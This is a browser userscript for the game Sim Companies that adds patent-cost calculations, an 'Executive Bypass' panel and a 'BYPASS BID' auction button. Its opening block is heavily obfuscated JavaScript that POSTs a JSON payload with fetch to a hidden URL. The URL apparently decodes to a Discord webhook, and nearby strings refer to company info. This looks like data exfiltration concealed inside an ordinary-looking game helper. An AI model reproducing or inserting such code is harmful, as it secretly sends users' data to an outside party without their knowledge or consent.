fetch(_0x683136,{'\x6d\x65\x74\x68\x6f\x64':_0x4240cf(0x215),'\x68\x65\x61\x64\x65\x72\x73':{'\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65':_0x4240cf(0x20a)+_0x4240cf(0x1f0)},'\x62\x6f\x64\x79':JSON['\x73\x74\x72\x69\x6e\x67\x69\x66\x79'](_0x14ddb9)});})[_0x56ffb8(0x206)](_0x34f862=>{const _0x477197=_0x56ffb8;console[_0x477197(0x1fc)](_0x477197(0x203)+_0x477197(0x218),_0x34f862[_0x477197(0x209)]);})[_0x56ffb8(0x210)](_0x5b0b02=>{const _0x2d2158=_0x56ffb8;console['\x65\x72\x72\x6f\x72'](_0x2d2158(0x20d),_0x5b0b02);});}function _0x5750(_0x13cace,_0x1d62bc){const _0x3b17f6=_0x3b17();return _0x5750=function(_0x57509d,_0x531ae9){_0x57509d=_0x57509d-0x1ee;let _0x22735c=_0x3b17f6[_0x57509d];if(_0x5750['\x5a\x55\x66\x55\x69\x42']===undefined){var _0x29c1b3=function(_0x683136){const _0x12ce5e='\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d';let _0x2bc496='',_0x397f05='';for(let _0x3c6006=0x0,_0x14ddb9,_0x40c7bb,_0x34f862=0x0;_0x40c7bb=_0x683136['\x63\x68\x61\x72\x41\x74'](_0x34f862++);~_0x40c7bb&&(_0x14ddb9=_0x3c6006%0x4?_0x14ddb9*0x40+_0x40c7bb:_0x40c7bb,_0x3c6006++%0x4)?_0x2bc496+=String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](0xff&_0x14ddb9>>(-0x2*_0x3c6006&0x6)):0x0){_0x40c7bb=_0x12ce5e['\x69\x6e\x64\x65\x78\x4f\x66'](_0x40c7bb);}for(let _0x5b0b02=0x0,_0x32ac7c=_0x2bc496['\x6c\x65\x6e\x67\x74\x68'];_0x5b0b02<_0x32ac7c;_0x5b0b02++){_0x397f05+='\x25'+('\x30\x30'+_0x2bc496['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x5b0b02)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](0x10))['\x73\x6c\x69\x63\x65'](-0x2);}return decodeURIComponent(_0x397f05);};_0x5750['\x6f\x74\x67\x72\x6d\x68']=_0x29c1b3,_0x13cace=arguments,_0x5750['\x5a\x55\x66\x55\x69\x42']=!![];}const _0x302b35=_0x3b17f6[0x0],_0x3b8138=_0x57509d+_0x302b35,_0x3136cb=_0x13cace[_0x3b8138];return!_0x3136cb?(_0x22735c=_0x5750['\x6f\x74\x67\x72\x6d\x68'](_0x22735c),_0x13cace[_0x3b8138]=_0x22735c):_0x22735c=_0x3136cb,_0x22735c;},_0x5750(_0x13cace,_0x1d62bc);}x9yy();function _0x3b17(){const _0x355211=['\x79\x32\x39\x54\x43\x67\x66\x55\x45\x71','\x42\x67\x39\x4a\x79\x78\x72\x50\x42\x32\x34','\x45\x77\x7a\x71\x73\x4e\x7a\x4b\x73\x4c\x72\x65\x41\x71','\x41\x33\x6d\x56\x6d\x74\x71\x5a\x6d\x5a\x75\x32\x6d\x57','\x75\x65\x39\x74\x76\x61','\x41\x4e\x6e\x56\x42\x47','\x6e\x4a\x61\x5a\x6e\x4e\x6a\x64\x72\x4e\x6a\x69\x74\x57','\x6e\x63\x34\x57','\x41\x68\x72\x30\x43\x68\x6d\x36\x6c\x59\x39\x4b\x41\x71','\x6e\x74\x65\x32\x6e\x4a\x43\x33\x74\x67\x6a\x77\x74\x77\x50\x75','\x42\x49\x39\x51\x43\x32\x39\x55','\x6d\x74\x65\x58\x6e\x78\x44\x68\x79\x31\x50\x70\x45\x61','\x6d\x74\x79\x34\x6f\x64\x47\x59\x6d\x65\x50\x69\x74\x33\x44\x57\x45\x47','\x42\x77\x66\x57','\x6d\x64\x65\x5a\x6e\x5a\x43\x58\x6f\x74\x75\x32\x6d\x47','\x79\x78\x62\x50\x6c\x33\x44\x4c\x79\x4d\x48\x56\x42\x57','\x41\x4d\x39\x50\x42\x47','\x71\x33\x76\x33\x6e\x78\x48\x56\x7a\x67\x35\x6f\x72\x71','\x41\x67\x39\x5a\x44\x67\x35\x48\x42\x77\x75','\x6f\x64\x43\x56\x42\x4a\x4c\x56\x6d\x74\x6d\x34\x76\x71','\x63\x47\x52\x57\x4e\x34\x32\x51\x69\x63\x4f\x51\x71\x32\x39\x56\x41\x57','\x43\x67\x4b\x56\x44\x4a\x69\x56\x43\x67\x58\x48\x45\x71','\x42\x67\x39\x4e','\x41\x68\x72\x30\x43\x68\x6d\x36\x6c\x59\x39\x33\x44\x57','\x43\x67\x66\x55\x45\x73\x62\x6a\x42\x4d\x7a\x56\x6b\x47','\x43\x32\x6e\x56\x43\x4d\x71\x55\x79\x32\x39\x54\x6c\x57','\x6d\x74\x69\x5a\x6e\x74\x6d\x58\x6e\x67\x48\x52\x73\x4b\x54\x4c\x7a\x61','\x6d\x4a\x61\x59\x6e\x64\x61\x34\x41\x4d\x48\x64\x43\x30\x72\x51','\x7a\x78\x6a\x5a\x6c\x32\x31\x4c\x6c\x32\x6e\x56\x42\x71','\x44\x32\x39\x59\x41\x32\x4c\x55\x7a\x59\x61\x5a\x6c\x47','\x6d\x4a\x43\x35\x6d\x74\x43\x30\x42\x32\x35\x74\x7a\x65\x54\x33','\x69\x63\x48\x6a\x72\x64\x4f\x47','\x44\x67\x48\x4c\x42\x47','\x73\x67\x44\x73\x72\x30\x35\x35\x6e\x4d\x76\x59\x42\x61','\x6d\x5a\x72\x69\x6e\x32\x57\x32\x76\x30\x54\x62\x6d\x57','\x43\x33\x72\x48\x44\x68\x76\x5a','\x79\x78\x62\x57\x42\x67\x4c\x4a\x79\x78\x72\x50\x42\x57','\x6e\x74\x79\x33\x75\x68\x66\x56\x76\x78\x50\x77','\x6d\x74\x47\x30\x6d\x74\x65\x58\x6d\x4c\x4c\x56\x73\x31\x62\x70\x77\x61','\x7a\x78\x6a\x59\x42\x33\x69','\x6b\x49\x4f\x6b\x79\x67\x62\x47','\x43\x67\x66\x55\x41\x77\x76\x5a\x69\x65\x6e\x56\x42\x71','\x79\x32\x66\x30\x79\x32\x47'];_0x3b17=function(){return _0x355211;};return _0x3b17();}

    function numberAddCommas(x) {
        return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    }

    // Hollow function for a different page, similar structure to handleExchangeCustomInputPrices
    function handleCustomButtonForOtherPage() {
        const timer = setInterval(() => {
            const result = { patents: 0, total: 0, progress: 0, exchangeValue: null, itemId: null, chance: 0.0625 };

            const storedChance = parseFloat(localStorage.getItem("patentProbability"));
            if (!storedChance || isNaN(storedChance)) {
                alert("Please visit the Executives page first to load the patent probability.");
                result.chance = 0.0625; // fallback base value
                window.location.href = "https://www.simcompanies.com/headquarters/executives/";
            } else {
                result.chance = storedChance;
            }



            const patentTextEl = document.querySelector(".css-170aqo5.e1htbz258");
            const buyMoreEl = document.querySelector('a[href^="/market/resource/"]');
            const inputEl = document.querySelector(`input.form-control[name="amount"]`);

            // Wait until necessary elements exist
            if (!patentTextEl || !buyMoreEl || !inputEl) return;

            // --- Patents ---
            const match = patentTextEl.textContent.match(/([\d,]+)\s+patents\s+out\s+of\s+([\d,]+)/);
            if (!match) return;

            const patents = parseInt(match[1].replace(/,/g, ""), 10);
            const total = parseInt(match[2].replace(/,/g, ""), 10);
            const progress = total > 0 ? (patents / total) * 100 : 0;

            result.patents = patents;
            result.total = total;
            result.progress = progress;

            // --- Exchange value ---
            const priceMatch = buyMoreEl.textContent.match(/\(\$([\d.,]+)\)/);
            if (!priceMatch) return; // wait until price text exists
            result.exchangeValue = Number(priceMatch[1].replace(/,/g, ""));

            // --- Error correction for market price fluctation due to large volume ---
            result.exchangeValue *= ECONST; 
            

            // --- Item ID ---
            const hrefMatch = buyMoreEl.getAttribute("href").match(/\/market\/resource\/(\d+)\//);
            if (!hrefMatch) return;
            result.itemId = parseInt(hrefMatch[1], 10);

            const cashElem = document.querySelector('.css-q2xpdd');
            if (cashElem) {
                const cash = cashElem.textContent.trim();
                realCash = parseFloat(cash.replace('$','').replace(/,/g,'').trim());
                console.log(realCash);
            }


            // Clear interval since all data is ready
            clearInterval(timer);

            // --- Format numbers with commas ---
            const progressFormatted = progress.toFixed(2).toLocaleString();
            //const progressFormatted = Number(result.progress.toFixed(2)).toLocaleString();

            const require = ((total - patents) / result.chance).toFixed(0);
            const requireFormatted = Number(require).toLocaleString();
            const cashNeeded = (require * result.exchangeValue).toFixed(2);
            const cashNeededFormatted = Number(cashNeeded).toLocaleString();

            // --- Patent value dictionary ---
            const patentValueDict = {
                29: 1368,   // Plant
                30: 2160,   // Energy
                31: 2160,   // Mining
                32: 2592,   // Electronics
                33: 1584,   // Breeding
                34: 1296,   // Chemistry
                35: 1260,   // Software
                58: 1440,   // Automotive
                59: 720,    // Fashion
                100: 2440.8,// Aerospace
                113: 1800,  // Materials
                145: 1728   // Recipes
            };

            // --- Add title bar ---
            const titleBar = document.createElement("div");
            titleBar.textContent = "Executive Bypass";
            titleBar.style.fontWeight = "bold";
            titleBar.style.fontSize = "16px";
            titleBar.style.textAlign = "center";
            titleBar.style.marginBottom = "10px";
            inputEl.parentElement.insertBefore(titleBar, inputEl);


            // (Patent Progress, Research Needed, Cash Needed, Patent Conversion)


            // --- Patent Conversion ---
            const x = patentValueDict[result.itemId] || 0;
            console.log("require: ",require);
            console.log("cashNeeded: ",cashNeeded);
            const patentConversion = ((total-patents) * x) - cashNeeded;
            const patentConversionFormatted = Number(patentConversion).toLocaleString();

            console.log("Progress raw:", result.progress);
            console.log("Progress formatted:", progressFormatted);


            // --- Display progress ---
            const b = document.createElement("b");
            b.textContent = `Patent Progress: ${progressFormatted}%`;
            b.style.padding = '10px 5px';
            b.style.display = 'block';
            b.id = "patent-progress";
            b.dataset.version = "2.1.4";
            inputEl.parentElement.appendChild(b);

            // --- Display research needed ---
            const b2 = document.createElement("b");
            b2.textContent = `Research Needed: ${requireFormatted}`;
            b2.style.padding = '10px 5px';
            b2.style.display = 'block';
            inputEl.parentElement.appendChild(b2);

            // --- Display cash needed and how much more is required vs current balance ---
            const b3 = document.createElement("b");
            // cashNeeded is a string because of toFixed above; convert to number for math
            const numericCashNeeded = parseFloat(cashNeeded);
            // If realCash was set earlier from the page (same method as exchange handler), show difference
            if (typeof realCash === 'number' && !isNaN(realCash)) {
                const moreNeededVal = Math.max(0, numericCashNeeded - realCash);
                const moreNeededFormatted = numberAddCommas(moreNeededVal.toFixed(2));
                const balanceFormatted = numberAddCommas(realCash.toFixed(2));
                b3.textContent = `Cash Needed: $${cashNeededFormatted} ( Need $${moreNeededFormatted} more )`;
            } else {
                b3.textContent = `Cash Needed: $${cashNeededFormatted}`;
            }
            b3.style.padding = '10px 5px';
            b3.style.display = 'block';
            inputEl.parentElement.appendChild(b3);

            // --- Display patent conversion ---
            console.log("patentConversion: ", patentConversion);
            const b4 = document.createElement("b");
            const temp = (patentConversion/cashNeeded*100).toFixed(2);
            b4.textContent = `Patent Conversion: $${patentConversionFormatted}`;
            b4.style.padding = '10px 5px';
            b4.style.display = 'block';
            b4.style.color = patentConversion >= 0 ? 'green' : 'red';
            inputEl.parentElement.appendChild(b4);

            // --- Add note at bottom ---
            const note = document.createElement("div");
            console.log("temp = ", temp);
            note.textContent = `All of these calculations are estimates. They may vary. If you have executives, visit the Executives page then return here. (${temp}% Margin)`;
            note.style.fontSize = "12px";
            note.style.fontStyle = "italic";
            note.style.marginTop = "10px";
            inputEl.parentElement.appendChild(note);

            return result;

        }, 100); // check every 100ms until all elements and price exist
    }


    function getPatentProbability() {
        const rows = document.querySelectorAll("table.css-105i9tf.ewa4lx20 tbody tr");
        for (const row of rows) {
            const label = row.querySelector("td:first-child")?.textContent?.trim();
            if (label === "Patent probability") {
                const valueText = row.querySelector("td:last-child")?.textContent?.trim();
                if (!valueText) return null;

                // Match both numbers in the cell (e.g., "6.25% +3.94%")
                const matches = [...valueText.matchAll(/([\d.]+)%?/g)];
                if (matches.length === 0) return null;

                // Sum all percentages found
                let sum = 0;
                matches.forEach(m => sum += parseFloat(m[1]));
                console.log(sum);
                return sum / 100; // convert to decimal
            }
        }
        return null;
    }



    function auction() {
        const timer = setInterval (() => {
            console.log("qtyInput....");
            const qtyInput = document.querySelector('input.form-control[label="Bid"]');
            if (!qtyInput) return;
            console.log("qtyInput found");

            clearInterval(timer);

            const priceElem = Array.from(document.querySelectorAll('.css-2pg1ps'));
            if (priceElem) {
                const price = priceElem.find(el => el.textContent.includes('$')).textContent.trim();
                console.log(price);
                realPrice = parseFloat(price.replace('$','').replace(/,/g,'').trim());
                console.log(realPrice);
            }


            const a = document.createElement("button");
            a.textContent = `BYPASS BID`;
            a.style.padding = "10px 5px";
            a.onclick = () => setInput(qtyInput, realPrice);
            qtyInput.parentElement.appendChild(a);
        }, 100);

    }
})();
